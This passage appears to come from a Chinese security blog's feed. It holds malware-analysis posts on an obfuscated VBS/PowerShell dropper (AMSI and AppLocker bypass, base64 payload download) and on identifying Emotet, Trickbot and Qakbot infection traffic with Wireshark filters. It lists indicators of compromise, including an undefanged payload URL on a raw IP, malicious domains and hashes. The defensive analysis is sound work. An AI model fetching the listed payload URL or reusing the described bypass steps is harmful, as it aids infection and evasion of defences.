执行我们重新整理好的vbs，结果完整的powershell代码就输出出来了。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-7.png" alt="5"></p><h2 id="4-powershell混淆-一"><a href="#4-powershell混淆-一" class="headerlink" title="4.powershell混淆(一)"></a>4.powershell混淆(一)</h2><p>我们可以看到该powershell的内容为混淆，但是我们可以对其进行解码混淆就是，去掉最后面的 I’E’X字符串</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-8.png" alt="20201-01-29-8"></p><p>那么我们重新整理之后的代码为下图输出后的内容</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-19.png" alt="20201-01-29-19"></p><p>下面我们来分析解码混淆后的代码，第一行代码为字符串拼接，为第一个红框注释的内容，为bypass asmi，第二个红框为下载执行base64加密的文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-9.png" alt="20201-01-29-9"></p><p>下图为base64的文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-10.png" alt="20201-01-29-10"></p><h2 id="5-powershell混淆-二"><a href="#5-powershell混淆-二" class="headerlink" title="5.powershell混淆(二)"></a>5.powershell混淆(二)</h2><p>我们对其进行解码后，为下图代码</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-11.png" alt="20201-01-29-11"></p><p>由于代码过于冗长我们挑几个重点讲解，我们看到下图中的红框1f,8b开头的数据 为gzip</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-12.png" alt="20201-01-29-12"></p><p>而下图 4d，5a开头的数据为我们熟悉PE文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-13.png" alt="20201-01-29-13"></p><p>下图为分离后的文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-14.png" alt="20201-01-29-14"></p><p>同时我们也对其进行解压，发现解压后的文件也是exe&#x2F;dll文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-15.png" alt="20201-01-29-15"></p><p>下图为在010编辑器中的内容</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-16.png" alt="20201-01-29-16"></p><p>下图为在powershell中我们第二个红框的pe文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-17.png" alt="20201-01-29-17"></p><p>所以最终的文件为，一个c#编写的dll，和一个exe文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-21.png" alt="20201-01-29-21"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-22.png" alt="20201-01-29-22"></p><p>我没有对其进行下一步的分析，因为也超出本文的含义分析范畴。大体可以猜测为后门文件。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-23.png" alt="20201-01-29-23"></p><p>最后在powershell的代码中我们，调用control.exe运行第二个exe，为bypass applocker的行为方式。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-20.png" alt="20201-01-29-20"></p><p>总体来说该powershell代码具体的内容如下：</p><p>1.bypass asmi</p><p>2.下载解码执行base64文件</p><p>3.解码后释放两个后门文件</p><p>4.bypass applocker</p><h2 id="6-IOC"><a href="#6-IOC" class="headerlink" title="6.IOC"></a>6.IOC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">MALWARE INFO</span><br><span class="line"></span><br><span class="line">- MD5: a649a8b1d9cb4bef0acadabc2b1fa864</span><br><span class="line">- File name: invoice.doc</span><br><span class="line">- File description: rtf</span><br><span class="line"></span><br><span class="line">- MD5: 00fa1544790efd966a7b3e74922e3ded</span><br><span class="line">- File location:  C:\\fakepath\\Client.vbs</span><br><span class="line">- File name: Client.vbs</span><br><span class="line">- File description: vbs混淆包含powershell代码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- MD5: d72dd093179e5d87ff7b78e34be5356e</span><br><span class="line">- File name: fine_base64.jpg</span><br><span class="line">- File location：http://108.61.166.11/m/fine.jpg</span><br><span class="line">- File description: base64加密的powershell代码</span><br><span class="line"></span><br><span class="line">- MD5: 5bc66dba582e2f787ba8a154ba731123</span><br><span class="line">- File name: MALWARE.gz</span><br><span class="line">- File description: gzip压缩包包含MALWARE.DLL</span><br><span class="line"></span><br><span class="line">- MD5: 9f0fd70fad2d371b74dab910e3f4ff92</span><br><span class="line">- File name: msbuild.DLL</span><br><span class="line"></span><br><span class="line">- MD5: 10ae54ef15948d730a7f73813a228adf</span><br><span class="line">- File name: MALWARE.exe</span><br><span class="line">- File description: jpg文件释放</span><br><span class="line"></span><br><span class="line">Connections </span><br><span class="line"> IP 108.61.166.11 </span><br><span class="line"> </span><br><span class="line">HTTP/HTTPS 请求  </span><br><span class="line"> URL http://108.61.166.11/m/fine.jpg</span><br></pre></td></tr></table></figure><h1 id="链接："><a href="#链接：" class="headerlink" title="链接："></a>链接：</h1><p><a href="https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/">https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/WechatIMG9.jpeg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="windows" scheme="https://www.ggsec.cn/categories/windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Windows" scheme="https://www.ggsec.cn/tags/Windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>分辨Emotet银行木马感染流量</title>
    <link href="https://www.ggsec.cn/%E5%88%86%E8%BE%A8Emotet%E6%84%9F%E6%9F%93%E6%B5%81%E9%87%8F.html"/>
    <id>https://www.ggsec.cn/%E5%88%86%E8%BE%A8Emotet%E6%84%9F%E6%9F%93%E6%B5%81%E9%87%8F.html</id>
    <published>2021-01-28T10:34:14.000Z</published>
    <updated>2022-11-25T12:51:39.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><h2 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h2><p>Emotet是一个信息窃取者，于2014年首次被报告为银行恶意软件。此后，它有了其他功能（例如，删除程序）进行了演变，分支了其他恶意软件家族，如Gootkit，IcedID，Qakbot和Trickbot。</p><p>由于上一篇从宏文件角度去分析Emotet银行木马的特征，但是本文从5个示例流量的区分是否是Emotet银行木马。同时可以帮助我们更好的溯源与分析。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-4.png" alt="2021-1-25-4"> </p><h2 id="2-了解"><a href="#2-了解" class="headerlink" title="2.了解"></a>2.了解</h2><p>要了解由Emotet引起的感染流量，我们必须首先了解导致感染的事件链。Emotet通常通过恶意垃圾邮件（malspam）电子邮件进行分发。Emotet感染链中的关键步骤是Microsoft Word文档，其中包含旨在感染易受攻击的Windows主机的宏。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-1.jpg" alt="2021-1-25-1"></p><p>垃圾邮件传播Emotet使用不同的技术来分发这些Word文档。下图说明了这四种感染技术。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-2.png" alt="2021-1-25-2"></p><p>  如果受害者打开文档并在易受攻击的Windows主机上启用了宏，则该主机感染了Emotet。</p><p>从流量的角度来看，我们看到从Emotet Word文档到Emotet感染的以下步骤：</p><ul><li>Web流量检索初始二进制文件。</li><li>通过HTTP的编码&#x2F;加密命令和控制（C2）通信。</li><li>如果Emotet丢弃了后续恶意软件，则会产生额外的感染流量。</li><li>如果Emotet使用受感染的主机作为垃圾邮件程序，则SMTP通信</li></ul><p>下图显示了我们在Emotet感染期间可能发现的网络活动的流程图</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-3.png" alt="2021-1-25-3"></p><h2 id="3-示例一-Emotet感染流量"><a href="#3-示例一-Emotet感染流量" class="headerlink" title="3.示例一 Emotet感染流量"></a>3.示例一 Emotet感染流量</h2><p>我们打开<strong>Example-1-2021-01-06-Emotet-infection.pcap</strong>，并对其HTTP&#x2F;HTTPS的基本过滤</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-5.png" alt="2021-1-25-5"></p><p>如上图所示，前五个HTTP GET请求代表用于检索初始Emotet DLL的四个URL。流量为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hangarlastik[.]com GET /cgi-bin/Ui4n/</span><br><span class="line">hangarlastik[.]com GET /cgi-sys/suspendedpage.cgi</span><br><span class="line">padreescapes[.]com GET /blog/0I/</span><br><span class="line">sarture[.]com GET /wp-includes/JD8/</span><br><span class="line">seo.udaipurkart[.]com GET /rx-5700-6hnr7/Sgms/</span><br></pre></td></tr></table></figure><p>我们来查看下 这个5个url的http响应是如何的，我们使用过滤器进行过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(http.request or http.response or tls.handshake.type eq 1) and !(ssdp)</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-6.png" alt="2021-1-25-6"></p><p>当我们看到最后一个url的时候是发现http未响应的，我们对其使用tcp流追踪。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-7.png" alt="2021-1-25-7"></p><p>追踪之后我们发现seo.udaipurkart [。] com返回了Windows DLL文件，如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-8.png" alt="2021-1-25-8"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-9.png" alt="2021-1-25-9"></p><p>我们对其导出文件,此提取的DLL的SHA256哈希为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8e37a82ff94c03a5be3f9dd76b9dfc335a0f70efc0d8fd3dca9ca34dd287de1b</span><br></pre></td></tr></table></figure><p>Emotet C2流量是使用HTTP POST请求发送的编码数据。您可以使用以下过滤器在Wireshark中轻松找到这些请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method eq POST</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-10.png" alt="2021-1-25-10"></p><p>在我们的第一个pcap中，Emotet C2流量由HTTP POST请求组成，这些请求包括：</p><ul><li>通过TCP端口80的5.2.136 [。] 90</li><li>TCP端口8080上为167.71.4 [。] 0</li></ul><p>Emotet为其C2流量生成两种类型的HTTP POST请求。第一种POST请求以HTTP &#x2F; 1.1结尾。第二种POST请求以HTTP&#x2F;1.1（application &#x2F; x-www-form-urlencoded）结尾。</p><p>按照针对初始HTTP请求的TCP流到达UTC 5.2.136 [。] 90（UTC时间16:42:34），以查看第一种C2 POST请求的示例，如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-11.png" alt="2021-1-25-11"></p><p>上图显示了该POST请求发送了大约6 KB的表单数据，该表单数据似乎是编码的或加密的二进制文件。向下滚动到HTTP响应以查看从服务器返回的编码数据。下图显示了此编码数据的开始。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-12.png" alt="2021-1-25-12"></p><p>这种类型的编码或加密数据是Emotet僵尸网络服务器与受感染Windows主机交换数据的方式。这也是Emotet用于更新Emotet DLL并删除后续恶意软件的渠道。</p><p>针对Emotet C2流量的第二种HTTP POST请求看起来与第一种不同。在Wireshark中使用以下过滤器可以轻松找到第二种HTTP POST请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urlencoded-form</span><br></pre></td></tr></table></figure><p>这应该通过TCP端口8080将两个HTTP POST请求返回到167.71.4 [。] 0，如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-13.png" alt="2021-1-25-13"></p><p>在16:58:43 UTC遵循TCP流中的这两个HTTP POST请求中的第一个。查看流量。结果如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-14.png" alt="2021-1-25-14"></p><p>如上图所示，POST请求中发送的某些数据被编码为具有某些URL编码的base64字符串。例如，％2B被用于+符号，％2F表示&#x2F;和％3D是用于&#x3D;。</p><p>来自服务器的响应发送的数据被编码或以其他方式加密。</p><p>这个恶意pcap中没有后续的恶意软件或其他重要活动。</p><p>唯一的其他活动是通过TCP端口443重复尝试连接到46.101.230 [。] 194。我们使用以下Wireshark过滤器对其进行过滤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp.analysis.retransmission和tcp.flags eq 0x0002</span><br></pre></td></tr></table></figure><p>结果如下图所示。<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-15.png" alt="2021-1-25-15"></p><p>在46.101.230 [。] 194上进行的Internet搜索应该显示此IP地址已用于Emotet C2活动。</p><p>pcap中的剩余流量是Microsoft Windows 10主机生成的系统流量。</p><h2 id="4-示例二-垃圾邮件流量的Emotet"><a href="#4-示例二-垃圾邮件流量的Emotet" class="headerlink" title="4.示例二 垃圾邮件流量的Emotet"></a>4.示例二 垃圾邮件流量的Emotet</h2><p>我们打开<strong>Example-2-2021-01-05-Emotet-with-spambot-traffic-part-1.pcap</strong>，并对其HTTP&#x2F;HTTPS的基本过滤</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-16.png" alt="2021-1-25-16"></p><p>与第一个示例类似，我们在Emotet C2流量之前收到了一些HTTP GET请求。这些GET请求是尝试通过网络流量下载初始Emotet DLL的尝试。列显示的第一帧显示到obob [。] tv的HTTPS流量，这可能是Web上对初始Emotet DLL的请求。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-17.png" alt="2021-1-25-17"></p><p>按照TCP流对miprimercamino [。] com的HTTP GET请求进行确认，以确认它返回了Emotet DLL。我们可以导出从miprimercamino [。] com返回的Emotet DLL ，如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-18.png" alt="2021-1-25-18"></p><p>从第二个pcap中提取的DLL的SHA256哈希为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">963b00584d8d63ea84585f7457e6ddcac9eda54428a432f388a1ffee21137316</span><br></pre></td></tr></table></figure><p>同样，我们发现针对Emotet C2流量的两种HTTP POST请求。要针对每种Emotet C2 HTTP POST请求进行过滤，请使用以下Wireshark过滤器：</p><ul><li><p>第一种类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request method eq POST and !(urlencoded-form)</span><br></pre></td></tr></table></figure></li><li><p>第二种：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urlencoded-form</span><br></pre></td></tr></table></figure><p>跟踪这些过滤器返回的HTTP POST请求的TCP流，并确认它们在第一个pcap中看到的相同模式。</p><p>在查看了来自该pcap的Emotet C2流量的一些示例之后，让我们继续进行spambot活动。</p><p>在此示例中，我们被感染的主机变成了垃圾邮件机器人，因此我们也有SMTP通信。spambot SMTP流量已加密，但是我们可以使用基本的Web过滤器并向下滚动列显示轻松找到它。</p><p>在20:06:20 UTC时，pcap开始显示与SMTP电子邮件协议相关的TCP端口的SSL &#x2F; TLS通信，例如TCP端口25、465和587，如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-20.png" alt="2021-1-25-20"></p><p>在建立加密的SMTP隧道之前，我们可以对smtp进行过滤以找到一些SMTP命令。下图显示了结果。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-19.png" alt="2021-1-25-19"></p><p>有时，我们可以从受Emotet感染的Windows主机生成的spambot流量中找到未加密的SMTP。未加密的SMTP将显示其邮件内容，但是来自spambot主机的加密SMTP的数量远远大于未加密的SMTP的数量。因此，来自受Emotet感染的主机的大多数spambot邮件都隐藏在加密流量中。</p><p>在此示例中，我们只看到加密的SMTP通信。</p><h2 id="5-示例三-Emotet和Spambot流量"><a href="#5-示例三-Emotet和Spambot流量" class="headerlink" title="5.示例三 Emotet和Spambot流量"></a>5.示例三 Emotet和Spambot流量</h2><p>我们打开<strong>Example-3-2021-01-05-Emotet-with-spambot-traffic-part-2.pcap</strong>，并对其HTTP&#x2F;HTTPS的基本过滤</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-21.png" alt="2021-1-25-21"></p><p>在此pcap中，我们仍然看到针对Emotet C2流量的HTTP POST请求，每分钟至少两次。我们还可以找到类似于之前的pcap的加密spambot活动。</p><p>Spambot活动经常产生大量流量。这个pcap包含来自受感染Windows主机的4分42秒的spambot活动，并且流量超过21 MB。</p><p>我们可以使用以下Wireshark筛选器快速识别任何未加密的SMTP通信：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smtp.data.fragment</span><br></pre></td></tr></table></figure><p>下图显示了我们第三个pcap的过滤器结果。结果显示为5个Emotet垃圾邮件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-22.png" alt="2021-1-25-22"></p><p>追踪TCP流中的最后一封电子邮件：“ Gladisbel Miranda，UTC时间20:19:54。，如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-23.png" alt="2021-1-25-23"></p><p>之后呢 我们可以对其5个垃圾邮件进行导出和分析。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-24.png" alt="2021-1-25-24"></p><p>Emotet是恶意软件下载器。通过Emotet分发的最常见的恶意软件可能是Trickbot。</p><h2 id="6-示例四-用Trickbot感染Emotet"><a href="#6-示例四-用Trickbot感染Emotet" class="headerlink" title="6.示例四 用Trickbot感染Emotet"></a>6.示例四 用Trickbot感染Emotet</h2><p>我们打开<strong>Example-4-2021-01-05-Emotet-infection-with-Trickbot.pcap</strong>，并对其HTTP&#x2F;HTTPS的基本过滤</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-25.png" alt="2021-1-25-25"></p><p>此pcap没有针对初始Emotet DLL的HTTP GET请求。但是，我们在列显示中的第一帧显示到fathekarim [。] com的HTTPS流量。这可能是针对Emotet DLL的网络请求。</p><p>此pcap还包含Trickbot感染的迹象。使用基本的Web过滤器并向下滚动以查找Trickbot流量，如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-26.png" alt="2021-1-25-26"></p><p>以下是Trickbot的常见指标：</p><ul><li>在没有关联域或主机名的情况下，通过TCP端口447或449进行的HTTPS通信。</li><li>通过标准或非标准TCP端口的HTTP POST请求，以&#x2F;81 ，&#x2F;83 或&#x2F;90结尾的HTTP流量与数据渗透相关联。</li><li>使用受Emotet感染的Trickbot时，上述HTTP POST请求以&#x2F; mor开头，后跟一个数字（到目前为止只能看到一个或两个数字）。</li><li>对以.png结尾的URL的HTTP GET请求，返回其他Trickbot二进制文件。</li></ul><p>我们可以使用以下Wireshark过滤器轻松找到这些指标：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tls.handshake.type eq 1 and (tcp.port eq 447 or tcp.port eq 449)</span><br><span class="line"></span><br><span class="line">(http.request.uri contains /81 or http.request.uri contains /83 or http.request.uri contains /90) and http.request.uri contains mor</span><br><span class="line"></span><br><span class="line">http.request.uri contains .png</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-27.png" alt="2021-1-25-27"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-28.png" alt="2021-1-25-28"></p><p>依据下图所示的每个HTTP POST请求的TCP流，以查看是否返回了Windows二进制文件。这样做应该显示两个Windows可执行文件。然后，使用文件–&gt;导出对象–&gt; HTTP从pcap导出这些二进制文件，如前面的示例中所述。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-29.png" alt="2021-1-25-29"></p><p>这两个Windows二进制文件（两个EXE文件）的SHA256哈希为：</p><ul><li><p>59e1711d6e4323da2dc22cdee30ba8876def991f6e476f29a0d3f983368ab461 for mingup.png</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-30.png" alt="2021-1-25-30"></p></li><li><p>ed8dea5381a7f6c78108a04344dc73d5669690b7ecfe6e44b2c61687a2306785 for save.png</p></li></ul><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-31.png" alt="2021-1-25-31"></p><p>Trickbot是Emotet分发的最常见的恶意软件，但并非唯一。Qakbot是另一种经常在感染了Emotet的Windows主机上丢弃的恶意软件。</p><h2 id="7-示例五-用Qakbot感染Emotet"><a href="#7-示例五-用Qakbot感染Emotet" class="headerlink" title="7.示例五 用Qakbot感染Emotet"></a>7.示例五 用Qakbot感染Emotet</h2><p>我们打开<strong>Example-5-2020-08-18-Emotet-infection-with-Qakbot.pcap</strong>，并对其HTTP&#x2F;HTTPS的基本过滤</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-32.png" alt="2021-1-25-32"></p><p>在我们最后的pcap中，21:23:50从saketpranamam.mysquare[。]in中检索了一个Emotet Word文档，该文档与报告为在同一日期托管Emotet Word文档的URL相匹配。如先前示例中所述，使用文件–&gt;导出对象–&gt; HTTP从pcap导出Word文档。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-33.png" alt="2021-1-25-33"></p><p>此提取的Word文档的SHA256哈希为：</p><ul><li>c7f429dde8986a1b2fc51a9b3f4a78a92311677a01790682120ab603fd3c2fcb</li></ul><p>此外，此pcap包含Qakbot感染的流量。如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-34.png" alt="2021-1-25-34"></p><p>以下是Qakbot的常见指标：</p><ul><li>通过HTTPS的标准和非标准TCP端口进行的HTTPS通信。</li><li>Qakbot HTTPS流量的证书数据在颁发者字段中具有异常值，并且证书不是由美国的颁发机构颁发的。</li><li>通过TCP端口65400的TCP流量。</li><li>2020年11月下旬之前，Qakbot通常生成到cdn.speedof [。] me的HTTPS流量。</li><li>2020年11月下旬之前，Qakbot通常会向a.strandsglobal [。] com生成HTTP GET请求。</li></ul><p>我们可以使用以下过滤器对其进行找到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tls.handshake.type eq 11 and !(x509sat.CountryName == US)</span><br><span class="line">tcp.port eq 65400</span><br><span class="line">tls.handshake.extensions_server_name contains speedof</span><br><span class="line">http.host contains strandsglobal</span><br></pre></td></tr></table></figure><p>下图所示第一个过滤器的结果在列显示中显示了来自71.80.66 [。] 107的流量的几帧。并找到异常的证书颁发者数据。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-35.png" alt="2021-1-25-35"></p><p>如下图所示我们找到了通过TCP端口65400的单个Qakbot通信的TCP流。此流包含受感染Qakbot的Windows主机的公共IP地址和僵尸网络标识字符串。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-36.png" alt="2021-1-25-36"></p><p>尽管Emotet通常删除了Trickbot和Qakbot，但要注意Emotet还删除了其他类型的恶意软件，例如Gootkit和IcedID。</p><h2 id="8-结论"><a href="#8-结论" class="headerlink" title="8.结论"></a>8.结论</h2><p>从感染流量的pcap中识别Emotet活动。我们回顾了五个最近的pcaps，发现由Emotet C2流量引起的HTTP POST请求中的相似之处。这些模式非常独特，可用于识别网络中的Emotet感染。我们还回顾了与Emotet相关的其他感染后活动，例如垃圾邮件程序流量和被感染主机上丢弃的各种恶意软件家族。</p><p>参考链接：</p><p><a href="https://unit42.paloaltonetworks.com/wireshark-tutorial-emotet-infection/">https://unit42.paloaltonetworks.com/wireshark-tutorial-emotet-infection/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;一、简介&quot;&gt;&lt;a href=&quot;#一、简介&quot; class=&quot;headerlink&quot; title=&quot;一、简介&quot;&gt;&lt;/a&gt;一、简介&lt;/h3&gt;&lt;h2 id=&quot;1-起源&quot;&gt;&lt;a href=&quot;#1-起源&quot; class=&quot;headerlink&quot; title=&quot;1.起源&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="windows" scheme="https://www.ggsec.cn/categories/windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Windows" scheme="https://www.ggsec.cn/tags/Windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Emotet银行木马宏样本分析</title>
    <link href="https://www.ggsec.cn/Emotet%E9%93%B6%E8%A1%8C%E6%9C%A8%E9%A9%AC%E5%AE%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html"/>
    <id>https://www.ggsec.cn/Emotet%E9%93%B6%E8%A1%8C%E6%9C%A8%E9%A9%AC%E5%AE%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html</id>
    <published>2021-01-15T10:34:14.000Z</published>
    <updated>2022-11-25T12:52:12.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-32.jpg" alt="1"></p><span id="more"></span><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p>Emotet银行木马首次发现是在2014年6月份，此银行木马主要通过垃圾邮件的方式进行传播感染目标用户，是一款比较著名且复杂的银行木马。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-1.jpeg" alt="1"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-30.png" alt="30"></p><h3 id="二、样本运行流程"><a href="#二、样本运行流程" class="headerlink" title="二、样本运行流程"></a>二、样本运行流程</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-2.png" alt="2"></p><h3 id="三、分析"><a href="#三、分析" class="headerlink" title="三、分析"></a>三、分析</h3><p>邮件附件DOC样本(重命名为2021-1-13-Emotet.doc)，如下所示：</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-3.png" alt="3"></p><p>打开文档之后，如下：</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-4.png" alt="4"></p><h4 id="3-1宏代码分析"><a href="#3-1宏代码分析" class="headerlink" title="3.1宏代码分析"></a>3.1宏代码分析</h4><p>使用oletools 套件的olevba，查看里面包含宏代码，如下：</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-5.png" alt="5"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-6.png" alt="6"></p><h4 id="3-2动态调试"><a href="#3-2动态调试" class="headerlink" title="3.2动态调试"></a>3.2动态调试</h4><p>从上面中我们隐约可以看到调用了WMI和一堆混淆。</p><p>我们这里直接去该文档的VBA编辑器，动态的调试，看到到底发生了什么。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-8.png" alt="8"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-9.png" 